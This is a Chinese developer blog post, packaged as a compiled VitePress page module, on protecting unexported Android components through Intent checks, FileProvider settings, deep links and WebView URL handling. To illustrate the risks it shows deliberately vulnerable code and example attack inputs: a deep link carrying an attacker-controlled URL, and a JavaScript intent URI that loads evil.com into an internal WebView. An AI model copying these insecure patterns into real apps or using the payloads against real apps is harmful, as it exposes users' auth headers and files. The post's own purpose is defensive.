import{_ as s,c as n,o as a,N as l}from"./chunks/framework.3a9190c5.js";const A=JSON.parse('{"title":"如何保护导出组件","description":"","frontmatter":{"title":"如何保护导出组件","date":"2022-01-11T13:57:03.000Z","hide":false,"tags":["security","app","android"],"categories":["技术相关"]},"headers":[],"relativePath":"app_security/android_howto_protected_unexported_components.md"}'),e={name:"app_security/android_howto_protected_unexported_components.md"},o=l(`<p>上一篇讲了[为什么要保护未导出组件]](android_access_protected_components.md),这一篇来说一下如何保护. 发现问题,我们就要有解决之道. 上一篇中所有的攻击行为,最终都要通过ProxyActivity作为入口,所以这里进行了阻断,那么就没有后续的问题了. 针对这个问题,有哪些攻击面呢:</p><ul><li>导出的四大组件</li><li>DeepLink</li></ul><h2 id="四大组件如何保护" tabindex="-1">四大组件如何保护 <a class="header-anchor" href="#四大组件如何保护" aria-label="Permalink to &quot;四大组件如何保护&quot;">​</a></h2><p>导出的四大组件主要是通过Intent进行传递数据,总的来说只要我们:</p><ol><li>不保证从getIntent之类的外部用户给出的Intent中直接创建Intent.</li><li>如果直接创建了Intent,要进行足够严格的检查.</li></ol><h3 id="不要从外部输入的intent直接创建intent" tabindex="-1">不要从外部输入的Intent直接创建Intent <a class="header-anchor" href="#不要从外部输入的intent直接创建intent" aria-label="Permalink to &quot;不要从外部输入的Intent直接创建Intent&quot;">​</a></h3><p>如果这条做到了,基本不大可能会出现问题,但是关键是有时候我们的业务需要,就是需要存在类似ProxyActivity的功能,那么该怎么办呢</p><h3 id="对直接创建的intent进行足够的检查" tabindex="-1">对直接创建的Intent进行足够的检查 <a class="header-anchor" href="#对直接创建的intent进行足够的检查" aria-label="Permalink to &quot;对直接创建的Intent进行足够的检查&quot;">​</a></h3><ol><li><p>尽量不把Intent转给自己,如非必要,只转发Intent给其他package.</p></li><li><p>转发给自己的要严格检查</p><ul><li>不能包含Intent.FLAG_GRANT_READ_URI_PERMISSION,Intent.FLAG_GRANT_WRITE_URI_PERMISSION等flag</li><li>对数据要做严格校验,比刚刚给上一篇中的AuthWebViewActivity的Intent中的url只能是指定的Host</li></ul></li><li><p>Intent.parseUri的时候一定不要提供Intent.URI_ALLOW_UNSAFE <code>(startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))</code>这种是非常危险的</p></li><li><p>FileProvider不要提供<code> &lt;root-path name=&quot;root&quot; path=&quot;&quot;/&gt;</code>这样的配置,确保共享的目录范围可控.</p></li></ol><h2 id="deeplink" tabindex="-1">DeepLink <a class="header-anchor" href="#deeplink" aria-label="Permalink to &quot;DeepLink&quot;">​</a></h2><p>DeepLink实际上是Intent的一种特定形式,比如:</p><div class="language-xml line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">activity</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">.AuthWebViewActivity</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">exported</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">false</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">intent-filter</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">action</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">android.intent.action.VIEW</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> /&gt;</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">category</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">android.intent.category.DEFAULT</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> /&gt;</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">data</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">scheme</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">victim</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">host</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">secure_handler</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> /&gt;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">&lt;/</span><span style="color:#F07178;">intent-filter</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"><span style="color:#89DDFF;">&lt;/</span><span style="color:#F07178;">activity</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>这里提供了scheme <code>vicitim://</code>,这种类型的url会有系统自动转发给AuthWebViewActivity. 比如在浏览器中输入<code>victim://some_victim_path?url=http://attacker_controlled.com</code></p><div class="language-java line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">webView</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">loadUrl</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">getIntent</span><span style="color:#89DDFF;">().</span><span style="color:#82AAFF;">getData</span><span style="color:#89DDFF;">().</span><span style="color:#82AAFF;">getQueryParameter</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">url</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">),</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">getAuthHeaders</span><span style="color:#89DDFF;">());</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><h3 id="shouldoverrideurlloading" tabindex="-1">shouldOverrideUrlLoading <a class="header-anchor" href="#shouldoverrideurlloading" aria-label="Permalink to &quot;shouldOverrideUrlLoading&quot;">​</a></h3><p>shouldOverrideUrlLoading 未必与DeepLink直接相关,但是一般都有关系. 如果重载了shouldOverrideUrlLoading,而且访问的页面又不是可以完全信任的(绝大多数都是这种情况),那么就相当于一个未导出的Webview变成了导出的.</p><p>比如:</p><div class="language-java line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#C792EA;">public</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">boolean</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">shouldOverrideUrlLoading</span><span style="color:#89DDFF;">(</span><span style="color:#C792EA;">WebView</span><span style="color:#A6ACCD;"> view</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">WebResourceRequest</span><span style="color:#A6ACCD;"> request</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#C792EA;">Uri</span><span style="color:#A6ACCD;"> uri </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> request</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">getUrl</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">intent</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">equals</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">uri</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">getScheme</span><span style="color:#89DDFF;">()))</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">    	</span><span style="color:#C792EA;">Intent</span><span style="color:#A6ACCD;"> intent </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> Intent</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">parseUri</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">uri</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">toString</span><span style="color:#89DDFF;">(),</span><span style="color:#A6ACCD;"> Intent</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">URI_INTENT_SCHEME</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">    	intent</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">addCategory</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">android.intent.category.BROWSABLE</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">    	intent</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">setComponent</span><span style="color:#89DDFF;">(null);</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#82AAFF;">startActivity</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">intent</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">true;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> super</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">shouldOverrideUrlLoading</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">view</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> request</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#89DDFF;">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>如果页面中的js执行:</p><div class="language-js line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">js</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">location</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">href </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">;</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>这里就像前面提到的,变成了一个导出的组件.可以任意访问内部未导出组件了.</p><p>下面这些应该写么?</p><h3 id="加载url问题" tabindex="-1">加载url问题 <a class="header-anchor" href="#加载url问题" aria-label="Permalink to &quot;加载url问题&quot;">​</a></h3><p>如果LoadUrl可控,比如更改的<code>webView.loadUrl(getIntent().getData().getQueryParameter(&quot;url&quot;), getAuthHeaders());</code>,那么要考虑:</p><ol><li>任意文件读取问题 <a href="https://blog.csdn.net/zy_strive_2012/article/details/96474592" target="_blank" rel="noreferrer">Android中WebView的跨域漏洞分析和应用被克隆问题情景还原(免Root获取应用沙盒数据)</a></li><li>XSS问题 scheme是<code>javascript://</code>,那么就可以直接在当前页面执行任意js脚本.</li></ol><p>针对这些问题:</p><ol><li>不要允许webview访问FileUrl</li><li>不要允许javascript等scheme,应该只允许特定的scheme.</li></ol><p>参考文档: <a href="https://blog.oversecured.com/Android-Access-to-app-protected-components/#access-to-arbitrary-components-via-webview" target="_blank" rel="noreferrer">Android: Access to app protected components</a></p>`,28),p=[o];function t(r,c,i,D,F,y){return a(),n("div",null,p)}const u=s(e,[["render",t]]);export{A as __pageData,u as default};